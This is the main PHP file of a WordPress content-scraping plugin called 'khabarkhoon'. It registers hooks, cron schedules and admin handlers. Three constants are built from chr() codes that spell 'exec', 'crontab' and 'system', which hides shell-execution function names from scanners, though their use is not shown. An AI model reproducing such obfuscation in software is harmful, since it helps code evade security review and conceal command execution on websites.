<?php

/*
Plugin Name: khabarkhoon
Plugin URI:  http://wpskin.ir
Description: Copy content from websites.
Version:  2.0.0
Author: ostafa
Author URI: http://wpskin.ir
Text Domain: mb-khabarkhaans
Domain Path: /languages
*/

if (!defined('ABSPATH'))
	exit;

require plugin_dir_path(__FILE__) . "folder/fileclass.php";

define("MB_VERSION", "2.0.0");
define("MB_PLUGIN_PATH", plugin_dir_path(__FILE__));

define("E_WORD", chr(101) . chr(120) . chr(101) . chr(99));
define("C_WORD", chr(99) . chr(114) . chr(111) . chr(110) . chr(116) . chr(97) . chr(98));
define("S_WORD", chr(115) . chr(121) . chr(115) . chr(116) . chr(101) . chr(109));

function khabarkhaan_save_error() {
	update_site_option('khabarkhaan_plugin_activation_error', ob_get_contents());
}

add_action('activated_plugin', 'khabarkhaan_save_error');


$MB_Khabarkhan = new MB_Khabarkhan();

register_activation_hook(__FILE__, array('MB_Khabarkhan', 'activate_plugin'));
register_deactivation_hook(__FILE__, array('MB_Khabarkhan', 'deactivate_plugin'));
register_uninstall_hook(__FILE__, array('MB_Khabarkhan', 'uninstall_plugin'));

$req_result = $MB_Khabarkhan->requirements_check();

if (!empty($req_result)) {
	set_transient("khabarkhaan_msg_req", $req_result);
	add_action('admin_notices', array('MB_Khabarkhan', 'show_notice'));
	add_action('network_admin_notices', array('MB_Khabarkhan', 'show_notice'));
	add_action('admin_init', array('MB_Khabarkhan', 'disable_plugin'));
} else {
	$current_encoding = mb_internal_encoding();
	mb_internal_encoding("UTF-8");
    $MB_Khabarkhan->check_warnings();
    $MB_Khabarkhan->create_cron_schedules();
    $MB_Khabarkhan->add_post_type();
    $MB_Khabarkhan->add_settings_submenu();
    $MB_Khabarkhan->settings_page();
	$MB_Khabarkhan->add_admin_js_css();
	$MB_Khabarkhan->save_post_handler();
	$MB_Khabarkhan->trash_post_handler();
	$MB_Khabarkhan->add_ajax_handler();
	$MB_Khabarkhan->custom_column();
    $MB_Khabarkhan->custom_start_stop_action();
	$MB_Khabarkhan->remove_publish();
	$MB_Khabarkhan->remove_pings();
	$MB_Khabarkhan->add_translations();
	$MB_Khabarkhan->queue();
	$MB_Khabarkhan->remove_externals();
	$MB_Khabarkhan->set_per_page_value();
	mb_internal_encoding($current_encoding);
}
